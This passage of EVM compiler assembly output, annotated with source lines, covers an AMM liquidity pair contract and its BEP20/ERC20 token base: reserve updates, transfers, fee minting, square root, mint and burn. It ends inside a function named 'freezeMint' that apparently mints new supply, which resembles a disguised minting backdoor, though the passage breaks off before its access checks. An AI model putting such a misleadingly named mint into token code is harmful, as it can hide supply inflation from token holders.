UQ112x112.encode(_reserve1).uqdiv */\n      tag_341\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_338:\n        /* \"src/Pair.sol\":3386:3406  price0CumulativeLast */\n      0x0c\n        /* \"src/Pair.sol\":3386:3506  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3426:3476  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/Pair.sol\":3426:3506  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/Pair.sol\":3386:3506  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3560:3640  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"src/Pair.sol\":3565:3609  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_342\n        /* \"src/Pair.sol\":3599:3608  _reserve1 */\n      dup5\n        /* \"src/Pair.sol\":3565:3592  UQ112x112.encode(_reserve0) */\n      tag_339\n        /* \"src/Pair.sol\":3582:3591  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":3565:3581  UQ112x112.encode */\n      tag_340\n        /* \"src/Pair.sol\":3565:3592  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"src/Pair.sol\":3565:3609  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_342:\n        /* \"src/Pair.sol\":3520:3540  price1CumulativeLast */\n      0x0d\n        /* \"src/Pair.sol\":3520:3640  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3560:3610  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/Pair.sol\":3560:3640  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/Pair.sol\":3520:3640  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3255:3651  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_337:\n        /* \"src/Pair.sol\":3660:3668  reserve0 */\n      0x0b\n        /* \"src/Pair.sol\":3660:3688  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"src/Pair.sol\":3698:3726  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3736:3771  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"src/Pair.sol\":3791:3799  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":3801:3809  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"src/Pair.sol\":2834:3817  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_183:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_346\n      swap1\n        /* \"src/ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_170\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_346:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_347\n      swap1\n        /* \"src/ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_348\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_347:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":3903:4796  function _mintFee(... */\n    tag_204:\n        /* \"src/Pair.sol\":3998:4008  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":4020:4033  address feeTo */\n      dup1\n        /* \"src/Pair.sol\":4045:4052  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":4036:4059  IFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_350\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_350:\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_351\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_351:\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_352\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_352:\n      pop\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      mload\n        /* \"src/Pair.sol\":4122:4127  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":4079:4098  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":4122:4127  kLast */\n      swap1\n        /* \"src/Pair.sol\":4152:4790  if (feeOn) {... */\n      tag_353\n      jumpi\n        /* \"src/Pair.sol\":4181:4192  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4177:4723  if (_kLast != 0) {... */\n      tag_354\n      jumpi\n        /* \"src/Pair.sol\":4212:4222  uint rootK */\n      0x00\n        /* \"src/Pair.sol\":4225:4266  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_355\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      tag_208\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":4235:4250  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":4235:4254  uint(_reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":4225:4266  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_355:\n        /* \"src/Pair.sol\":4212:4266  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4284:4298  uint rootKLast */\n      0x00\n        /* \"src/Pair.sol\":4301:4318  Math.sqrt(_kLast) */\n      tag_357\n        /* \"src/Pair.sol\":4311:4317  _kLast */\n      dup4\n        /* \"src/Pair.sol\":4301:4310  Math.sqrt */\n      tag_209\n        /* \"src/Pair.sol\":4301:4318  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_357:\n        /* \"src/Pair.sol\":4284:4318  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4348:4357  rootKLast */\n      dup1\n        /* \"src/Pair.sol\":4340:4345  rootK */\n      dup3\n        /* \"src/Pair.sol\":4340:4357  rootK > rootKLast */\n      gt\n        /* \"src/Pair.sol\":4336:4709  if (rootK > rootKLast) {... */\n      iszero\n      tag_358\n      jumpi\n        /* \"src/Pair.sol\":4381:4395  uint numerator */\n      0x00\n        /* \"src/Pair.sol\":4398:4488  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_359\n        /* \"src/Pair.sol\":4465:4466  8 */\n      0x08\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_175\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      tag_361\n        /* \"src/Pair.sol\":4414:4419  rootK */\n      dup7\n        /* \"src/Pair.sol\":4424:4433  rootKLast */\n      dup7\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"src/Pair.sol\":4414:4423  rootK.sub */\n      tag_170\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_361:\n        /* \"src/Pair.sol\":4398:4409  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"src/Pair.sol\":4398:4413  totalSupply.mul */\n      tag_168\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":4398:4488  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_359:\n        /* \"src/Pair.sol\":4381:4488  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4510:4526  uint denominator */\n      0x00\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_362\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      tag_363\n        /* \"src/Pair.sol\":4547:4556  rootKLast */\n      dup5\n        /* \"src/Pair.sol\":4561:4562  8 */\n      0x08\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      0xffffffff\n        /* \"src/Pair.sol\":4547:4560  rootKLast.mul */\n      tag_168\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_363:\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      tag_364\n        /* \"src/Pair.sol\":4529:4534  rootK */\n      dup7\n        /* \"src/Pair.sol\":4539:4541  17 */\n      0x11\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      0xffffffff\n        /* \"src/Pair.sol\":4529:4538  rootK.mul */\n      tag_168\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_364:\n        /* \"src/Pair.sol\":4529:4546  rootK.mul(17).add */\n      swap1\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"src/Pair.sol\":4529:4546  rootK.mul(17).add */\n      tag_348\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_362:\n        /* \"src/Pair.sol\":4510:4564  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4586:4600  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":4615:4626  denominator */\n      dup2\n        /* \"src/Pair.sol\":4603:4612  numerator */\n      dup4\n        /* \"src/Pair.sol\":4603:4626  numerator / denominator */\n      dup2\n      tag_365\n      jumpi\n      invalid\n    tag_365:\n      div\n      swap1\n      pop\n        /* \"src/Pair.sol\":4652:4665  liquidity > 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4648:4690  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_367\n      jumpi\n        /* \"src/Pair.sol\":4667:4690  _mint(feeTo, liquidity) */\n      tag_367\n        /* \"src/Pair.sol\":4673:4678  feeTo */\n      dup8\n        /* \"src/Pair.sol\":4680:4689  liquidity */\n      dup3\n        /* \"src/Pair.sol\":4667:4672  _mint */\n      tag_211\n        /* \"src/Pair.sol\":4667:4690  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_367:\n        /* \"src/Pair.sol\":4336:4709  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_358:\n        /* \"src/Pair.sol\":4177:4723  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_354:\n        /* \"src/Pair.sol\":4152:4790  if (feeOn) {... */\n      jump(tag_369)\n    tag_353:\n        /* \"src/Pair.sol\":4743:4754  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4739:4790  if (_kLast != 0) {... */\n      tag_369\n      jumpi\n        /* \"src/Pair.sol\":4778:4779  0 */\n      0x00\n        /* \"src/Pair.sol\":4770:4775  kLast */\n      0x0e\n        /* \"src/Pair.sol\":4770:4779  kLast = 0 */\n      sstore\n        /* \"src/Pair.sol\":4739:4790  if (_kLast != 0) {... */\n    tag_369:\n        /* \"src/Pair.sol\":3903:4796  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_209:\n        /* \"src/Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"src/Math.sol\":429:430  3 */\n      0x03\n        /* \"src/Math.sol\":425:426  y */\n      dup3\n        /* \"src/Math.sol\":425:430  y > 3 */\n      gt\n        /* \"src/Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_371\n      jumpi\n      pop\n        /* \"src/Math.sol\":450:451  y */\n      dup1\n        /* \"src/Math.sol\":485:486  1 */\n      0x01\n        /* \"src/Math.sol\":481:482  2 */\n      0x02\n        /* \"src/Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"src/Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n    tag_373:\n        /* \"src/Math.sol\":511:512  z */\n      dup2\n        /* \"src/Math.sol\":507:508  x */\n      dup2\n        /* \"src/Math.sol\":507:512  x < z */\n      lt\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_374\n      jumpi\n        /* \"src/Math.sol\":536:537  x */\n      dup1\n        /* \"src/Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"src/Math.sol\":573:574  2 */\n      0x02\n        /* \"src/Math.sol\":568:569  x */\n      dup2\n        /* \"src/Math.sol\":564:565  x */\n      dup3\n        /* \"src/Math.sol\":560:561  y */\n      dup6\n        /* \"src/Math.sol\":560:565  y / x */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n        /* \"src/Math.sol\":560:569  y / x + x */\n      add\n        /* \"src/Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_376\n      jumpi\n      invalid\n    tag_376:\n      div\n        /* \"src/Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n      jump(tag_373)\n    tag_374:\n        /* \"src/Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_378)\n    tag_371:\n        /* \"src/Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"src/Math.sol\":605:647  if (y != 0) {... */\n      tag_378\n      jumpi\n      pop\n        /* \"src/Math.sol\":635:636  1 */\n      0x01\n        /* \"src/Math.sol\":605:647  if (y != 0) {... */\n    tag_378:\n        /* \"src/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n    tag_211:\n        /* \"src/ERC20.sol\":1583:1594  totalSupply */\n      sload(0x00)\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      tag_380\n      swap1\n        /* \"src/ERC20.sol\":1599:1604  value */\n      dup3\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":1583:1598  totalSupply.add */\n      tag_348\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_380:\n        /* \"src/ERC20.sol\":1569:1580  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":1569:1605  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1631:1644  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":1631:1640  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":1631:1644  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      tag_381\n      swap1\n        /* \"src/ERC20.sol\":1649:1654  value */\n      dup3\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":1631:1648  balanceOf[to].add */\n      tag_348\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_381:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":1615:1624  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":1615:1655  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_218:\n        /* \"src/Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"src/Math.sol\":221:222  y */\n      dup2\n        /* \"src/Math.sol\":217:218  x */\n      dup4\n        /* \"src/Math.sol\":217:222  x < y */\n      lt\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n      tag_383\n      jumpi\n        /* \"src/Math.sol\":229:230  y */\n      dup2\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n      jump(tag_384)\n    tag_383:\n        /* \"src/Math.sol\":225:226  x */\n      dup3\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n    tag_384:\n        /* \"src/Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"src/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n    tag_242:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2277:2292  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2277:2286  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2277:2292  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      tag_386\n      swap1\n        /* \"src/ERC20.sol\":2297:2302  value */\n      dup3\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2277:2296  balanceOf[from].sub */\n      tag_170\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_386:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2259:2274  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2259:2268  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2259:2274  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"src/ERC20.sol\":2259:2303  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"src/ERC20.sol\":2327:2338  totalSupply */\n      sload\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      tag_387\n      swap1\n        /* \"src/ERC20.sol\":2343:2348  value */\n      dup3\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2327:2342  totalSupply.sub */\n      tag_170\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_387:\n        /* \"src/ERC20.sol\":2313:2324  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":2313:2349  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"src/ERC20.sol\":2364:2397  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":1714:2190  function freezeMint(... */\n    tag_293:\n        /* \"src/ERC20.sol\":1807:1811  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1869:1890  account != address(0) */\n      dup4\n      and\n        /* \"src/ERC20.sol\":1861:1926  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_389\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_389:\n        /* \"src/ERC20.sol\":2016:2027  totalSupply */\n      sload(0x00)\n        /* \"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      tag_390\n      swap1\n        /* \"src/ERC20.sol\":2032:2038  amount */\n      dup4\n        /* 